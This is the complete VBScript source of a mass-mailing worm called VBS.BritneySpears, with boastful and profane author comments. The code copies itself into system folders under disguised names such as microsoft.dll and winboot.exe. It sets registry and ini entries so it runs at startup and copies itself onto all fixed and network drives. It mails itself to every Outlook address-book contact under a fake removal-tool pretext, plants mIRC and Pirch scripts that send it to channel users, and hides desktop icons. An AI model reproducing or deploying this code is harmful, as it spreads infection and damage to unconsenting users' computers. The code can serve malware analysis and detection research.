'Some junk data just for the fuck of it!
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'
'Previous Viruses by LorDAngeR^GueSS
'VBS.§t4®©h1lÐ AKA Es Como La Cocaîna
'VBS.Anti-Virus (Anti-Virii)
'And some various fuckupfiles (.bat and .exe's)
'FACE DOWN AZZ UP THATS THE WAY WE LIKE TO FUCK!
'hgdsfbsiofbswfkidtewitmertmn8753fmnt2895m6nf80mnt8od6mjo8my63dmt643mf0635ft365fy366yh35y3j773
'g3moi3gmn3nmfnyocg6iny3ocmn0983mngc87x3mg3mg9c35mgc3my98gc8639c0g653gc
'gc3gco35gc9mc6089mn2g89 289cn2 982 292nxc92nmxn87,__s-.s.z,mu709ÿ
'fapofindsaoif7nsilufniwgbiwbguwbvnv86nfv9n6r3ovm0rq7m0grq8mgpq9,gqgq3g
'gr3qågoeqrpog,meqpogmueqopigmnu79e8rqungyengoieqmgeqgefågäöäögäåöfägåöeg39g02g13g31
'gregergeoprgegmqelkgmeqlgmjleqmgjlkjeqmgeqmgkleqjgeqhg veqveqv
'fwqefuwnfiluwynfwlfif++¨g4rewdvg
'Temp data junkmpotherfucker
'idontknowifthis'llworkbutisurehopeso
'possiblethanks:#nohackondalnetfortesing/analyzingthisvirus
'µGµuµeµ§µ§µ

'
''
'''
''''
'''
''
'
l_klasse_msgbox_message_text	= "VBS.BritneySpears Virus By: LorDAngeR Of The Gue§§ CreW"
l_goaway_msgbox_message_text	= "Want The Virus To Be Left On Your System?"

'*Comment:*
'This is added for the LorDAngeR Addon2 of the Tune.vbs virus created by Slug
'VBS.BritneySpears 
'Mail your help with VBS coding to:
'LorDAngeR@hotmail.com (yes! i know its stupid)
'FBI Can suck my cock!
'The Swedish SÄPO can do the same thing to my cock
'The internationall cop thing may not do that!
'Unless there is girls included there :)
'Britney! Mail me :)
'Why need William when you got me :P
'Ooh! God Is A DJ!!
'This is my church, this is where i heal my hurts!
'
'VBS.BritneySpears - You just gotta love it!
'The Official Gue§§ Site is availible on:
'www.welcome.to/brunflo (mirror)
'and www.LorDAngeR.com
'
'Britney Spears - Baby One More Time(Ospina Dance Mix)
'Britney Spears - Sometimes (Thunderpuss 2k Mix)
'Thats the two songs that i listened to when i did this shit
'Ok ok ok ok...
'I Listened to DJ ClaustroPhobiC AKA LorDAngeR - The Club(Even More Trance Remix) at the end!
'
'Why Be Mad When You Can Be Sad?
'Why Be Sad When You Can Be Mad?
'
'
'14:29 2000-02-29
'
'Function htmlesc(str)
'str = Replace(str, "&", "&amp;")
'str = Replace(str, "<", "&lt;")
'htmlesc = Replace(str, ">", "&gt;")
'End Function


L_Welcome_MsgBox_Message_Text   = "VBS.BritneySpears By LorDAngeR Of The Gue§§ CreW"
L_Welcome_MsgBox_Title_Text     = "Write: I LOVE U BRITNEY and press Enter!"
Call Welcome()





sub Britney()
On Error Resume Next
Dim obj, sysfldr,s, f, MyShortcut, MyDesktop, DesktopPath
'Read Path (Shortcut)
'DesktopPath = WSHShell.SpecialFolders("Desktop")
'Create the shortcut(s)
'Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\VBS.BritneySpears.lnk")
Set obj = CreateObject("Scripting.FileSystemObject")
Set sysfldr = obj.GetSpecialFolder(1)
Set winfldr = obj.GetSpecialFolder(0)
Set tmpfldr = obj.GetSpecialFolder(2)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(sysfldr&"\Britney.vbs")
f.copy(winfldr&"\klasseboy.vbs")
f.copy(tmpfldr&"\Britney.vbs")
f.copy(tmpfldr&"\LorDAngeR.vbs")
f.copy(tmpfldr&"\microsoft.dll")
f.copy(winfldr&"\winboot.exe")
f.copy(winfldr&"\winboot.vxd")
f.copy(sysfldr&"\logo.bmp")
f.copy(winfldr&"\Britney.vbs")

loc=winfldr&"\klasseboy.vbs"
loc1=sysfldr&"\Britney.vbs"
loc2=tmpfldr&"\Britney.vbs"
loc3=sysfldr&"\microsoft.dll"
loc4=winfldr&"\winboot.exe"
loc5="explorer.exe"
loc6="GueSS.txt"
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
editini winfldr&"\win.ini","[windows]","load",loc3
editini winfldr&"\win.ini","[windows]","run",loc4
editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5
editini sysfldr&"\GueSS.txt","This Virus Was Created By LorDAngeR Of The Gue§§ Crew!",loc6
ntwrk()
end sub
sub infect(drive)
On Error Resume Next
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(drive & "\Britney.vbs")
path=drive&"\Britney.vbs"
end sub
Function ShowDriveType(drvpath)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
if t = "" then t = "None"
ShowDriveType = t
End Function
sub ntwrk()
On Error Resume Next
for n = 65 to 90
l=Chr(n) 
drv=l&":"
d3=ShowDriveType(drv)
if d3 = "Fixed" then infect(drv)
if d3 = "Network" then infect(drv)
next
sprd()
end sub
sub sprd()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Warning For The VBS.Britney Virus!!! Created By: LorDAngeR Of The Gue§§ CreW"
Maie.Body = "If you dont want to recieve VBS.Britney, please run the Protector/Remover (i included it in my mail)"
Maie.Attachments.Add WScript.ScriptFullName
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
etc()    
end sub
sub etc()
On Error Resume Next
a=ReportFolderStatus("C:\mirc")
if a="1" then mirc()
b=ReportFolderStatus("C:\windows")
if b="1" then windows()
end sub
Britney()
Function ReportFileStatus(filespec)
On Error Resume Next
Dim fso, msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists(filespec)) Then
msg = "1"
Else
msg = "0"
End If
ReportFileStatus = msg
End Function
Function ReportFolderStatus(fldr)
On Error Resume Next
Dim fso, msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FolderExists(fldr)) Then
msg = "1"
Else
msg = "0"
End If
ReportFolderStatus = msg
End Function
sub mirc()
On Error Resume Next
Dim fso4, folder
Set fso4 = CreateObject("Scripting.FileSystemObject")
Set winfolder = fso4.GetSpecialFolder(1)
path = winfolder&"\britney.vbs"
Dim fso34, f132, t2s
Const ForWriting = 2
Set fso34 = CreateObject("Scripting.FileSystemObject")
fso34.CreateTextFile ("c:\mirc\script.ini")
Set f132 = fso34.GetFile("c:\mirc\script.ini")
Set t2s = f132.OpenAsTextStream(ForWriting, false)
t2s.write "[script]" & vbcrlf
t2s.write "n0=ON 1:JOIN:#:/dcc send $nick " & path & vbcrlf
t2s.write "n1=on 1:join:#:/say Im infected the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.write "n2=on 1:join:#:$amsg Im infected with the VBS.BritneySpears virus created by LorDAngeR^Gue§§
t2s.close
editini "C:\mirc\mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
editini "C:\mirc\mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0"
editini "C:\mirc\mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1"
end sub
sub windows()
On Error Resume Next
Dim fso4, folder
Set fso4 = CreateObject("Scripting.FileSystemObject")
Set winfolder = fso4.GetSpecialFolder(1)
path = winfolder&"\Britney.vbs"
Dim fso, f1, ts
Const ForWriting = 2
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateTextFile ("c:\pirch98\events.ini")
Set f1 = fso.GetFile("c:\pirch98\events.ini")
Set ts = f1.OpenAsTextStream(ForWriting, false)
ts.write "[Levels]"&vbcrlf
ts.write "Enabled=1"&vbcrlf
ts.write "Count=6"&vbcrlf
ts.write "Level1=000-Unknowns"&vbcrlf
ts.write "000-UnknownsEnabled=1"&vbcrlf
ts.write "Level2=100-Level 100"&vbcrlf
ts.write "100-Level 100Enabled=1"&vbcrlf
ts.write "Level3=200-Level 200"&vbcrlf
ts.write "200-Level 200Enabled=1"&vbcrlf
ts.write "Level4=300-Level 300"&vbcrlf
ts.write "300-Level 300Enabled=1"&vbcrlf
ts.write "Level5=400-Level 400"&vbcrlf
ts.write "400-Level 400Enabled=1"&vbcrlf
ts.write "Level6=500-Level 500"&vbcrlf
ts.write "500-Level 500Enabled=1"&vbcrlf
ts.write vbcrlf
ts.write "[000-Unknowns]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/msg $nick Hi there, Im Infected with the VBS.BritneySpears virus created by LorDAngeR^Gue§§"&vbcrlf
ts.write "event2=on join:#:$amsg Hi $chan $+, Im Infected with the VBS.BritneySpears virus Created by LorDAngeR^Gue§§"&vbcrlf
ts.write "EventCount=2"&vbcrlf
ts.write vbcrlf
ts.write "[100-Level 100]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/dcc send $nick " & path &vbcrlf
ts.write "EventCount=1"&vbcrlf
ts.write vbcrlf
ts.write "[200-Level 200]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[300-Level 300]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[400-Level 400]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[500-Level 500]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
editini "C:\pirch98\pirch98.ini","[DCC]","AutoHideDccWin","1"
end sub
sub editini(filename,section,string,newvalue)
on error resume next
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile(iniFile, ForReading)
lines = Split(ts.ReadAll,vbCrLf)
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
if bKeyChanged then
Set ts = fso.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
set ts = nothing
set fso = nothing
end sub
'Poooooofff! No Icons :)
wshshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideIcons", 1, "REG_DWORD"
WScript.Echo ("Hit Me Baby One More Time - Miss Britney Spears")
WScript.Echo ("You Should Feel happy!!")
WScript.Echo ("After all, This took me some time to write!")
WScript.Echo ("*My Lonelyness in killing me, And I, I must confess i still belive, when im not with you i loose my mind, give me a sign HIT ME BABY ONE MORE TIME!*")
WScript.Echo ("What Have You Done To My Mind!?!?!?!")
WScript.Echo ("*Clickclickclick*")
WScript.Echo ("LorDAngeR's Greets:")
WScript.Echo ("kOnDa")
WScript.Echo ("Prevel")
WScript.Echo ("Aithor")
WScript.Echo ("Frosty 'Flikka'")
WScript.Echo ("Hehehe, Your mouse should be warm by now 'computer mouse!!! Pervert!'")
WScript.Echo ("Why Be Mad When You Can Be Sad? Wee! 13messages! There Is 13 Letters In Britney Spears name!!! *totally in extacy!*")





Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _   
                      vbOKCancel + vbInformation,       _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Echo ("Here in Sweden, we dont like quitters!")
	call welcome()
    End If
End Sub

Sub Goaway()
    Dim intDontDoIt

    intDontDoIt =  MsgBox(l_goaway_msgbox_message_text,    _   
                      vbOKCancel + vbInformation,       _
                      l_klasse_msgbox_message_text)
    If intDontDoIt = vbCancel Then
        WScript.Echo ("Windows Exeptional Error 9598: Stack Overflow In Module 254, The Program Returned A Error Description: VBS.BritneySpears Virus By LorDAngeR^Gue§§ Is Left In RAM-Memory")
call goaway()
	elseif intdontdoit = vbOK then
        WScript.Echo ("VBS.BritneySpears Was Successfully Removed!")
	End If
End Sub






'
'Add-on and othershit .. eeerhmm.. Anyway!
'This is VBS.Britney By LorDAngeR^Gue§§
'It's heavily based on Tune.vbs by Slug
'Gue§§ CreW Are:
'LorDAngeR and kOnDa
'This is just a pre-release of VBS.Britney
'Dedicated to: Britney Spears 
'Ill add a icon flooder for Windows9x and
'some other stuff in the next version!
'
'Fun to see your icons dissapear eh ? :)
'
'LorDAngeR@AntiSocial.com
'The author cant be held responsible for the possible damage caused
'by this program!
'
'Sweden Suxxxxxxxxxxxxxxxxxxx!
